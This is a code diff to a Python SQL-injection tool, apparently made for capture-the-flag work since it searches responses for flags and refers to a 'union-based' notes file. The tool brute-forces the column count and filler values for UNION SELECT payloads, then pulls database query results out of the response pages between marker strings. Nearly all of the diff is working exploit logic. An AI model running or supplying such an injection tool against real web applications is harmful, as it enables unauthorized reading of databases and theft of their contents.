@@ -50,40 +50,42 @@ def main():
         return r.status_code, html.unescape(r.text)
 
     p, cm = a.prefix, a.comment
-    n = a.cols
-    if not n:
-        for i in range(1, 21):
-            st, body = send(f"{p} UNION SELECT {','.join(['NULL'] * i)}{cm}")
-            if st == 200 and not re.search(r"error|different number|columns", body, re.I):
-                n = i
-                break
-        if not n:
-            raise SystemExit("could not determine column count; pass --cols and check --prefix/--comment")
-    print(f"[+] columns: {n}")
-    markers = [f"'zq{i}qz'" for i in range(n)]
-    st, body = send(f"{p} UNION SELECT {','.join(markers)}{cm}")
-    shown = [i for i in range(n) if f"zq{i}qz" in body]
-    print(f"[+] reflected columns (0-based): {shown}")
-    if not shown:
-        raise SystemExit("no reflected column (types? try --dbms postgres with NULLs) ")
-    col = shown[0]
+    base_st, base_body = send(a.prefix + "zzno")   # a value matching nothing -> not-found page
     q = TABLES[a.dbms] if a.tables else a.query
-    if not q:
-        return
-    cols = ["NULL"] * n
-    cols[col] = f"({q})"
-    st, body = send(f"{p} UNION SELECT {','.join(cols)}{cm}")
-    m = re.search(r"zq\d+qz", body)
-    print(f"[{st}] result page {len(body)}B")
-    fl = FLAG.findall(body)
-    if fl:
-        print("[FLAG]", *fl)
-    # show the text around where the marker column normally appears
-    cols2 = list(cols)
-    cols2[col] = f"'<<<'||({q})||'>>>'" if a.dbms != "mysql" else f"CONCAT('<<<',({q}),'>>>')"
-    st, body = send(f"{p} UNION SELECT {','.join(cols2)}{cm}")
-    for hit in re.findall(r"<<<(.*?)>>>", body, re.S):
-        print("[result]", hit)
+    conc = (lambda e: f"'<<<'||({e})||'>>>'") if a.dbms in ("sqlite", "postgres") else \
+           (lambda e: f"CONCAT('<<<',({e}),'>>>')")
+
+    # Filler for the columns we are NOT reading. Some apps render NULL or an int in
+    # the "wrong" column and 500; a short quoted string renders in any text/image
+    # column. We try several filler styles and keep the first that stops 500-ing.
+    FILLERS = ["'zq{}z'", "{}", "NULL"]
+
+    def row(n, col, fill):
+        return [conc(q) if (q and j == col) else (f"'<<<c{j}>>>'" if (not q and j == col)
+                else fill.format(j + 1)) for j in range(n)]
+
+    counts = [a.cols] if a.cols else range(1, 26)
+    for n in counts:
+        for fill in FILLERS:
+            # try putting the marker in each column; a working (count, filler, col)
+            # renders our <<<...>>> somewhere.
+            for col in range(n):
+                st, body = send(f"{p} UNION SELECT {','.join(row(n, col, fill))}{cm}")
+                hits = re.findall(r"<<<(.*?)>>>", body, re.S)
+                flags = FLAG.findall(body)
+                if hits or flags:
+                    print(f"[+] columns={n} filler={fill!r} column={col}")
+                    for h in hits:
+                        print(f"[result] {h}")
+                    for fl in flags:
+                        print(f"[FLAG] {fl}")
+                    return
+            # cheap early exit: if NO filler/col at this count ever differs from the
+            # not-found baseline, this count is wrong -- move on quickly.
+        if a.cols:
+            break
+    raise SystemExit("no UNION point found; check --prefix/--comment/--dbms, or use the manual "
+                     "payload in 06-sqli/union-based.md")
 
 
 if __name__ == "__main__":
